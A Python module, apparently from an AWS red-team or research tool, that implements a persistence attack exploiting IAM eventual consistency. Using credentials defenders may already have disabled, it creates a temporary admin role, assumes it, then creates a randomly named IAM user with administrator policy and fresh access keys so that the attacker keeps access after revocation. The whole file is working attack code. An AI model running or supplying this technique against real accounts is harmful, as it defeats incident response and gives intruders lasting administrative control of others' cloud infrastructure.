"""
Access Key Persistence Scenario (Scenario A).

This module implements the access key persistence technique that maintains
access even when defenders delete access keys or users. The technique exploits
AWS IAM eventual consistency by creating new users with access keys within
the ~4 second propagation window.
"""

import logging
import time
from typing import Set

from .aws_clients import IAMClient, STSClient
from .models import Credentials, PolicyDocument
from .resource_names import generate_role_name, generate_user_name, generate_policy_name


logger = logging.getLogger(__name__)


class AccessKeyPersistence:
    """
    Implements access key persistence by rotating to new IAM users.
    
    When access keys are disabled or deleted, this class creates a temporary
    role, assumes it to get temporary credentials, creates a new IAM user with
    access keys, and then deletes the temporary role. This maintains persistent
    access even after defenders attempt to revoke it.
    
    Attributes:
        iam: IAM client for AWS API operations
        logger: Logger instance for operation logging
        created_users: Set of usernames created by this instance
    """
    
    def __init__(self, iam_client: IAMClient, logger_instance: logging.Logger = None):
        """
        Initialize AccessKeyPersistence.
        
        Args:
            iam_client: IAM client for AWS operations
            logger_instance: Optional logger instance (defaults to module logger)
        """
        self.iam = iam_client
        self.logger = logger_instance or logger
        self.created_users: Set[str] = set()
    
    def execute(self, current_credentials: Credentials, account_id: str, original_user_name: str) -> Credentials:
        """
        Execute the access key persistence scenario.

        This method creates a NEW user with a random name (not the original) by:
        1. Creating a temporary role with admin access (using disabled creds - consistency window)
        2. Assuming the temp role to get temporary credentials
        3. Using temp role creds to create a new user with a fresh random name
        4. Creating access keys for the new user
        5. Storing temp role info for cleanup after rotation

        The new user gets a random name the defender cannot predict, making it
        harder for them to target the rotated identity.

        Args:
            current_credentials: Current AWS credentials (may be disabled but still valid)
            account_id: AWS account ID for trust policy
            original_user_name: Name of the original user (used for logging only)

        Returns:
            Credentials: New persistent credentials for the newly created user

        Raises:
            ClientError: If any AWS API operation fails
        """
        self.logger.info(f"Starting access key persistence scenario (rotating away from: {original_user_name})")

        temp_role_name = None
        temp_policy_name = None

        try:
            admin_policy = PolicyDocument.administrator_access()

            # Step 1: Create temporary role with inline policy (using disabled credentials)
            temp_role_name = self._generate_temp_role_name()
            temp_policy_name = generate_policy_name()
            self.logger.info(f"Creating temporary role: {temp_role_name}")
            trust_policy = PolicyDocument.same_account_trust(account_id)

            try:
                self.iam.create_role(
                    role_name=temp_role_name,
                    assume_role_policy_document=trust_policy.to_json()
                )
            except Exception as e:
                self.logger.error(
                    f"Failed to create temporary role {temp_role_name}: {str(e)}",
                    exc_info=True
                )
                raise

            # Attach policy to temporary role
            self.logger.info(f"Attaching policy {temp_policy_name} to temporary role")

            try:
                self.iam.put_role_policy(
                    role_name=temp_role_name,
                    policy_name=temp_policy_name,
                    policy_document=admin_policy.to_json()
                )
            except Exception as e:
                self.logger.error(
                    f"Failed to attach policy to temporary role {temp_role_name}: {str(e)}",
                    exc_info=True
                )
                try:
                    self.iam.delete_role(temp_role_name)
                except:
                    pass
                raise

            # Step 2: Assume role to get temporary credentials
            self.logger.info(f"Assuming temporary role: {temp_role_name}")
            temp_role_arn = f"arn:aws:iam::{account_id}:role/{temp_role_name}"
            sts_client = STSClient(current_credentials)

            try:
                temp_credentials = sts_client.assume_role(
                    role_arn=temp_role_arn,
                    role_session_name="notyet-temp-session"
                )

                # Store temp credentials for debugging
                self.temp_credentials = temp_credentials

            except Exception as e:
                self.logger.error(
                    f"Failed to assume temporary role {temp_role_name}: {str(e)}",
                    exc_info=True
                )
                try:
                    self.iam.delete_role_policy(temp_role_name, temp_policy_name)
                    self.iam.delete_role(temp_role_name)
                except:
                    pass
                raise

            # Step 3: Wait for temp role permissions to propagate
            # The inline policy on the temp role may not be available immediately
            self.logger.info("Waiting for temp role permissions to propagate...")
            temp_iam_client = IAMClient(temp_credentials)

            max_propagation_retries = 10
            propagation_delay = 1  # seconds
            for attempt in range(max_propagation_retries):
                try:
                    # Test if we can list users (lightweight IAM read that requires permissions)
                    temp_iam_client._retry_with_backoff('list_users', MaxItems=1)
                    self.logger.info(f"Temp role permissions propagated after {attempt + 1} attempt(s)")
                    break
                except Exception as prop_error:
                    error_str = str(prop_error)
                    if "AccessDenied" in error_str and "no identity-based policy allows" in error_str:
                        if attempt < max_propagation_retries - 1:
                            self.logger.info(
                                f"Temp role policy not yet propagated, retrying in {propagation_delay}s "
                                f"(attempt {attempt + 1}/{max_propagation_retries})"
                            )
                            time.sleep(propagation_delay)
                            continue
                        else:
                            self.logger.error("Temp role policy never propagated")
                            raise
                    else:
                        # Some other error — might still work, proceed
                        self.logger.warning(f"Unexpected error during propagation wait: {error_str}")
                        break

            # Step 4: Create a NEW user with a random name (using temp role credentials)
            new_user_name = generate_user_name()
            self.logger.info(f"Creating new user: {new_user_name}")

            try:
                temp_iam_client._retry_with_backoff('create_user', UserName=new_user_name)
                self.created_users.add(new_user_name)
            except Exception as e:
                self.logger.error(
                    f"Failed to create new user {new_user_name}: {str(e)}",
                    exc_info=True
                )
                raise

            # Step 5: Attach admin policy to new user
            new_user_policy_name = generate_policy_name()
            self.logger.info(f"Attaching policy {new_user_policy_name} to new user {new_user_name}")

            try:
                temp_iam_client._retry_with_backoff(
                    'put_user_policy',
                    UserName=new_user_name,
                    PolicyName=new_user_policy_name,
                    PolicyDocument=admin_policy.to_json()
                )
            except Exception as e:
                self.logger.error(
                    f"Failed to attach policy to new user {new_user_name}: {str(e)}",
                    exc_info=True
                )
                raise

            # Step 6: Create access keys for new user
            self.logger.info(f"Creating access keys for new user: {new_user_name}")

            try:
                response = temp_iam_client._retry_with_backoff('create_access_key', UserName=new_user_name)
                access_key = response['AccessKey']

                new_credentials = Credentials(
                    access_key_id=access_key['AccessKeyId'],
                    secret_access_key=access_key['SecretAccessKey'],
                    session_token=None
                )
            except Exception as e:
                self.logger.error(
                    f"Failed to create access keys for new user {new_user_name}: {str(e)}",
                    exc_info=True
                )
                raise

            # Step 7: Store temporary role info for cleanup after rotation
            self.temp_role_name = temp_role_name
            self.temp_policy_name = temp_policy_name

            self.logger.info(
                f"Access key persistence scenario completed. "
                f"New user: {new_user_name}, New access key: {new_credentials.access_key_id}"
            )

            return new_credentials

        except Exception as e:
            self.logger.error(f"Access key persistence scenario failed: {str(e)}")
            raise

    def _generate_temp_role_name(self) -> str:
        """
        Generate a temporary role name with the notyet-role-tmp- prefix.

        Returns:
            str: A role name in the format "notyet-role-tmp-{suffix}"
        """
        from .resource_names import generate_random_suffix
        suffix = generate_random_suffix()
        return f"notyet-role-tmp-{suffix}"
